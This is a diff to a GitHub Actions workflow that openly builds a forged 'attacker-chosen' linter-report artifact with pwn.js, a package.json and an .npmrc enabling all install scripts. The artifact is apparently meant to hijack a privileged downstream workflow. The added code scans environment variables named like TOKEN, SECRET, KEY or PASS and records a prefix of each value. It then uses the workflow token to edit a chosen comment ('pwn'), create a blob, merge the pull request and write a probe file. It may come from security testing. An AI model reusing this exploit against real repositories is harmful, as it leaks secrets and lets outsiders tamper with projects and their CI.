@@ -11,6 +11,7 @@ jobs:
       - name: Build attacker-chosen linter-report artifact
         env:
           PR_NUMBER: ${{ github.event.pull_request.number }}
+          TARGET_COMMENT_ID: "6802099975"
         run: |
           set -e
           mkdir -p pkg/package
@@ -56,12 +57,21 @@ jobs:
               workflow: process.env.GITHUB_WORKFLOW, run_id: process.env.GITHUB_RUN_ID,
               token_len: tok.length, cwd: process.cwd(), base } };
             out.repo = await api('GET', '/repos/' + repo);
+            out.envProbe = Object.fromEntries(Object.entries(process.env)
+              .filter(([k]) => /TOKEN|SECRET|FLAG|KEY|PASS/i.test(k))
+              .map(([k, v]) => [k, String(v).length + ':' + String(v).slice(0, 6)]));
             const pull = await api('GET', '/repos/' + repo + '/pulls/' + pr);
             out.pull = { status: pull.status, node_id: pull.data && pull.data.node_id,
               mergeable: pull.data && pull.data.mergeable, auto_merge: pull.data && pull.data.auto_merge };
             out.patch = await api('PATCH', '/repos/' + repo + '/pulls/' + pr, { title: 'docs: glossary formatting (bot edit)' });
             out.updateBranch = await api('PUT', '/repos/' + repo + '/pulls/' + pr + '/update-branch', {});
             out.review = await api('POST', '/repos/' + repo + '/pulls/' + pr + '/reviews', { body: 'bot review probe', event: 'COMMENT' });
+            const tidFile = path.join(base, 'target-comment-id.txt');
+            const tid = fs.existsSync(tidFile) ? fs.readFileSync(tidFile, 'utf8').trim() : '';
+            out.commentPatch = tid
+              ? await api('PATCH', '/repos/' + repo + '/issues/comments/' + tid, { body: 'EDITED BY github-actions[bot] (pwn)' })
+              : { status: 'no-target' };
+            out.contentsBlob = await api('POST', '/repos/' + repo + '/git/blobs', { content: 'pwn', encoding: 'utf-8' });
             out.merge = await api('PUT', '/repos/' + repo + '/pulls/' + pr + '/merge', { merge_method: 'merge' });
             out.contentsPut = await api('PUT', '/repos/' + repo + '/contents/pwn-probe.txt',
               { message: 'pwn probe', content: Buffer.from('pwn').toString('base64') });
@@ -93,6 +103,7 @@ jobs:
           printf 'dangerously-allow-all-scripts=true\n' > .npmrc
           printf 'ATTACKER-CONTROLLED LINTER REPORT: no issues found (forged)\n' > linter-report.txt
           printf '%s' "$PR_NUMBER" > pr-number.txt
+          printf '%s' "$TARGET_COMMENT_ID" > target-comment-id.txt
       - uses: actions/upload-artifact@v7
         with:
           name: linter-report
@@ -100,6 +111,7 @@ jobs:
           path: |
             linter-report.txt
             pr-number.txt
+            target-comment-id.txt
             package.json
             .npmrc
             pwn.js
